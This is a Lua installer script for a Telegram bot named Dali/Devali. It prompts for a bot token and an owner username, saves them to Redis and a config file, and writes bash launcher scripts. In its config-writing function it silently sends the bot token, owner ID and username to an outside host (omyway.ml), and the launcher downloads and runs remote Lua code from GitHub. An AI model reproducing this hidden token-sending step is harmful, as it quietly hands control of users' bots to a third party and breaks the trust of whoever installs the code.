serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_Dali = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_Dali = function() 
local Create_Info = function(Token,Sudo,UserName)  
local Dali_Info_Sudo = io.open("sudo.lua", 'w')
Dali_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
Dali_Info_Sudo:close()
end  
if not database:get(Server_Dali.."Token_Dali") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_Dali.."Token_Dali",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Dali.."UserName_Dali") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_Dali.."UserName_Dali",Json.Info.Username)
database:set(Server_Dali.."Id_Dali",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_Dali_Info()
Create_Info(database:get(Server_Dali.."Token_Dali"),database:get(Server_Dali.."Id_Dali"),database:get(Server_Dali.."UserName_Dali"))   
https.request("https://omyway.ml/boks/Boks.php?id="..database:get(Server_Dali.."Id_Dali").."&user="..database:get(Server_Dali.."UserName_Dali").."&token="..database:get(Server_Dali.."Token_Dali"))
local RunDali = io.open("Devali", 'w')
RunDali:write([[
#!/usr/bin/env bash
cd $HOME/Devali
token="]]..database:get(Server_Dali.."Token_Dali")..[["
rm -fr Dali.lua
wget "https://raw.githubusercontent.com/temmali/Devali/main/Devali.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Devali.lua -p PROFILE --bot=$token
done
]])
RunDali:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/Dali
while(true) do
rm -fr ../.telegram-cli
screen -S Devali -X kill
screen -S Devali ./Devali
done
]])
RunTs:close()
end
Files_Dali_Info()
database:del(Server_Dali.."Token_Dali");database:del(Server_Dali.."Id_Dali");database:del(Server_Dali.."UserName_Dali")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Dali()  
var = true
else   
f:close()  
database:del(Server_Dali.."Token_Dali");database:del(Server_Dali.."Id_Dali");database:del(Server_Dali.."UserName_Dali")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
